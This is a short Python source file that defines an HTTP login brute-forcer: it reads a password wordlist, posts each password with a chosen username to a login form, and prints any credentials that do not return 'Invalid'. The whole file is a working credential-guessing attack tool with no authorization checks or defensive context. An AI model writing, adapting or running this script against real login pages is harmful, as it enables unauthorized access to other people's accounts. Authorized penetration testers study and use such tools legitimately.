import requests


class HTTPBruteForcer:
    def __init__(self, url, username, password_list, username_field, password_field):
        self.url = url
        self.username = username
        self.password_list = password_list
        self.username_field = username_field
        self.password_field = password_field

    def run(self):
        with open(self.password_list, 'r') as file:
            for password in file:
                password = password.strip()
                if self.attempt_login(password):
                    print(f"[+] Successful login: {self.username}:{password}")
                    return
                else:
                    print(f"[-] Failed: {password}")

    def attempt_login(self, password):
        data = {self.username_field: self.username, self.password_field: password}
        response = requests.post(self.url, data=data)
        return "Invalid" not in response.text  # Modify this condition as needed
